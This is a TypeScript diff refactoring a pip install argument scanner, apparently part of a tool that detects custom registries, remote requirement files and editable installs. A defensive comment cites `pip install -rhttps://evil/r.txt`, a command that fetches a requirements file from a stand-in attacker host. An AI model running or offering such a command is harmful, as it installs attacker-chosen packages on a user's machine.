@@ -55,71 +55,80 @@ const PIP_FLAG_TAKES_VALUE = new Set([
 // Walk pip's post-`install` args, separating positional package specs from flags.
 // Captures a custom index URL, a -r/--requirement manifest file, and whether a
 // -c/--constraint was present. Editable (-e/--editable) targets are positionals.
+// The per-token matching lives in `consumePipToken` — a top-level function
+// (not a closure over the loop) so its if-chain scores at nesting 0 instead of
+// nesting 1; this loop is deliberately just the iteration, with no branching.
 function scanPipFlags(args: string[]): PipFlagScan {
-	const positionals: string[] = [];
-	let customRegistry: string | undefined;
-	let manifestFile: string | undefined;
-	let fromConstraints = false;
+	const scan: PipFlagScan = {
+		positionals: [],
+		customRegistry: undefined,
+		manifestFile: undefined,
+		fromConstraints: false,
+	};
 
 	for (let i = 0; i < args.length; i++) {
-		const a = args[i];
-		if (a === "--index-url" || a === "-i" || a === "--extra-index-url") {
-			customRegistry = args[i + 1];
-			i++;
-			continue;
-		}
-		const m = nonNull(a).match(/^(?:--index-url|--extra-index-url|-i)=(.+)$/);
-		if (m) {
-			customRegistry = m[1];
-			continue;
-		}
-		if (a === "-r" || a === "--requirement") {
-			manifestFile = args[i + 1];
-			i++;
-			continue;
-		}
-		const mr = nonNull(a).match(/^--requirement=(.+)$/);
-		if (mr) {
-			manifestFile = mr[1];
-			continue;
-		}
-		if (a === "-c" || a === "--constraint") {
-			fromConstraints = true;
-			i++;
-			continue;
-		}
-		if (scanPipEditable(nonNull(a), args[i + 1], positionals)) {
-			i++;
-			continue;
-		}
-		const meq = nonNull(a).match(/^--editable=(.+)$/);
-		if (meq) {
-			positionals.push(nonNull(meq[1]));
-			continue;
-		}
-		// ATTACHED short-option values — optparse-style pip accepts the value glued
-		// to the flag: `-rreqs.txt`, `-ihttps://mirror`, `-cconstraints.txt`,
-		// `-egit+URL`. Without this branch each parsed as an unknown flag and was
-		// silently skipped, so `pip install -rhttps://evil/r.txt` looked like a
-		// bare manifest sync and the manifest/registry/editable signals were lost —
-		// the same attached-value class as the git `-mfix` finding (2026-06).
-		const glued = nonNull(a).match(/^-([rice])(.+)$/);
-		if (glued) {
-			const value = glued[2] ?? "";
-			if (glued[1] === "r") manifestFile = value;
-			else if (glued[1] === "i") customRegistry = value;
-			else if (glued[1] === "c") fromConstraints = true;
-			else positionals.push(value); // -e<spec>: the value IS the install spec
-			continue;
-		}
-		if (nonNull(a).startsWith("-")) {
-			if (pipFlagConsumesValue(nonNull(a), args[i + 1])) i++;
-			continue;
-		}
-		positionals.push(nonNull(a));
+		i += consumePipToken(args, i, scan);
 	}
 
-	return { positionals, customRegistry, manifestFile, fromConstraints };
+	return scan;
+}
+
+// Classify ONE pip argument token at `args[i]`, mutating `scan` for its
+// effect. Returns the count of ADDITIONAL tokens consumed beyond `args[i]`
+// itself (0 or 1) — same semantics as the original inline `i++`ing loop body,
+// relocated here so the caller's `for` stays a single unbranched statement.
+function consumePipToken(args: string[], i: number, scan: PipFlagScan): number {
+	const a = nonNull(args[i]);
+	if (a === "--index-url" || a === "-i" || a === "--extra-index-url") {
+		scan.customRegistry = args[i + 1];
+		return 1;
+	}
+	const m = a.match(/^(?:--index-url|--extra-index-url|-i)=(.+)$/);
+	if (m) {
+		scan.customRegistry = m[1];
+		return 0;
+	}
+	if (a === "-r" || a === "--requirement") {
+		scan.manifestFile = args[i + 1];
+		return 1;
+	}
+	const mr = a.match(/^--requirement=(.+)$/);
+	if (mr) {
+		scan.manifestFile = mr[1];
+		return 0;
+	}
+	if (a === "-c" || a === "--constraint") {
+		scan.fromConstraints = true;
+		return 1;
+	}
+	if (scanPipEditable(a, args[i + 1], scan.positionals)) {
+		return 1;
+	}
+	const meq = a.match(/^--editable=(.+)$/);
+	if (meq) {
+		scan.positionals.push(nonNull(meq[1]));
+		return 0;
+	}
+	// ATTACHED short-option values — optparse-style pip accepts the value glued
+	// to the flag: `-rreqs.txt`, `-ihttps://mirror`, `-cconstraints.txt`,
+	// `-egit+URL`. Without this branch each parsed as an unknown flag and was
+	// silently skipped, so `pip install -rhttps://evil/r.txt` looked like a
+	// bare manifest sync and the manifest/registry/editable signals were lost —
+	// the same attached-value class as the git `-mfix` finding (2026-06).
+	const glued = a.match(/^-([rice])(.+)$/);
+	if (glued) {
+		const value = glued[2] ?? "";
+		if (glued[1] === "r") scan.manifestFile = value;
+		else if (glued[1] === "i") scan.customRegistry = value;
+		else if (glued[1] === "c") scan.fromConstraints = true;
+		else scan.positionals.push(value); // -e<spec>: the value IS the install spec
+		return 0;
+	}
+	if (a.startsWith("-")) {
+		return pipFlagConsumesValue(a, args[i + 1]) ? 1 : 0;
+	}
+	scan.positionals.push(a);
+	return 0;
 }
 
 // True when a generic pip flag `a` takes a separate value token (and that token,
